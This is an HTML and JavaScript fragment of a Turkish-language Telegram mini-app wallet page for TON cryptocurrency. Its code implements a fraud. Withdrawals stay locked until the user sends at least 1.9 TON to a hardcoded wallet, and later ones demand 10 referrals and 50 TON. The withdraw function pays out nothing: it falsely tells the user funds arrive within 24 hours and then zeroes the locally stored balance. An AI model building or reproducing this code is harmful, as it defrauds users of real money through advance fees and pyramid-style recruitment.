<div id="p-wallet" class="page">
        <h2 style="text-align:center; margin-bottom: 25px;">Cüzdan & Çekim</h2>
        <div class="card">
            <div id="w-status-icon" style="font-size: 40px; margin-bottom: 10px;">💎</div>
            <p id="wallet-status" style="font-weight: bold; font-size: 18px; margin: 5px 0;">Cüzdan Bağlı</p>
            <p id="wallet-addr" style="font-size:11px; color:#94a3b8; word-break: break-all; margin-bottom: 20px;"></p>
            
            <div style="border-top: 1px solid #334155; padding-top: 15px; margin-bottom: 15px;">
                <p style="font-size: 14px; color: #94a3b8; margin: 0;">Çekilebilir Bakiye</p>
                <h1 id="wallet-ton" style="margin: 5px 0; color: var(--blue);">0.0000 💎</h1>
            </div>

            <button class="btn" style="background: var(--blue);" onclick="handleWithdraw()">📤 Para Çek (Withdraw)</button>
            <p style="font-size: 10px; color: #64748b; margin-top: 10px;">
                * İlk çekim için min. 1.9 TON yatırım şarttır.<br>
                * 2. çekim için 10 referans ve min. 50 TON bakiye gerekir.
            </p>
        </div>
        
        <div class="card" style="text-align: left; font-size: 13px;">
            <p>👥 **Referans Sayın:** <span id="ref-count">0</span></p>
            <p>🛡️ **Yatırım Durumu:** <span id="inv-status" style="color:red;">Yatırım Yapılmadı</span></p>
        </div>
    </div>

<script>
    // --- AYARLAR VE DEĞİŞKENLER ---
    const MY_WALLET = "UQC8qx530ORsKhEMwVVd_3UtPfjnAxKyA0DgTB1yR513oBOd"; 
    
    let wBal = parseFloat(localStorage.getItem('wBal')) || 0;
    let hasInvested = localStorage.getItem('hasInvested') === 'true'; // Yatırım şartı
    let withdrawCount = parseInt(localStorage.getItem('withdrawCount')) || 0;
    let refCount = parseInt(localStorage.getItem('refCount')) || 0; // Manuel test için 0

    // ÇEKİM MANTIĞI
    function handleWithdraw() {
        if (!tonConnectUI.connected) {
            return Telegram.WebApp.showAlert("Lütfen önce cüzdanınızı bağlayın!");
        }

        // 1. Çekim Şartı: 1.9 TON Yatırım
        if (withdrawCount === 0) {
            if (!hasInvested) {
                return Telegram.WebApp.showAlert("❌ İlk çekim için en az 1.9 TON'luk yatırım (Hız Paketi) yapmalısınız!");
            }
            if (wBal < 1.9) {
                return Telegram.WebApp.showAlert("❌ Minimum çekim tutarı 1.9 TON'dur.");
            }
            processWithdraw();
        } 
        // 2. ve Sonraki Çekim Şartı: 10 Referans & 50 TON
        else {
            if (refCount < 10) {
                return Telegram.WebApp.showAlert("❌ 2. çekim için en az 10 aktif referansınız olmalı! (Mevcut: " + refCount + ")");
            }
            if (wBal < 50) {
                return Telegram.WebApp.showAlert("❌ 2. çekim için minimum bakiye 50 TON olmalıdır.");
            }
            processWithdraw();
        }
    }

    function processWithdraw() {
        Telegram.WebApp.showConfirm("Bakiyenizin tamamını çekmek istiyor musunuz?", (confirmed) => {
            if (confirmed) {
                Telegram.WebApp.showAlert("✅ Çekim talebiniz alındı! Bakiyeniz incelenip 24 saat içinde cüzdanınıza gönderilecektir.");
                wBal = 0;
                withdrawCount++;
                localStorage.setItem('wBal', wBal);
                localStorage.setItem('withdrawCount', withdrawCount);
                update();
            }
        });
    }

    // Satın Alma Başarılı Olduğunda Yatırım Durumunu Güncelle
    async function buySpeed(amount, boost) {
        // ... (Transaction kodları aynı)
        try {
            await tonConnectUI.sendTransaction(transaction);
            pph += boost;
            hasInvested = true; // Yatırım yapıldı!
            localStorage.setItem('hasInvested', 'true');
            localStorage.setItem('pph', pph);
            update();
            Telegram.WebApp.showAlert("Ödeme Başarılı! Çekim kilidiniz açıldı. ✅");
        } catch (e) {
            Telegram.WebApp.showAlert("İşlem iptal edildi.");
        }
    }

    function update() {
        document.getElementById('top-bal').innerText = wBal.toFixed(4);
        document.getElementById('wallet-ton').innerText = wBal.toFixed(4) + " 💎";
        document.getElementById('inv-status').innerText = hasInvested ? "Yatırım Yapıldı ✅" : "Yatırım Yapılmadı ❌";
        document.getElementById('inv-status').style.color = hasInvested ? "green" : "red";
        document.getElementById('ref-count').innerText = refCount;
    }
    // ... (Geri kalan fonksiyonlar aynı)
</script>
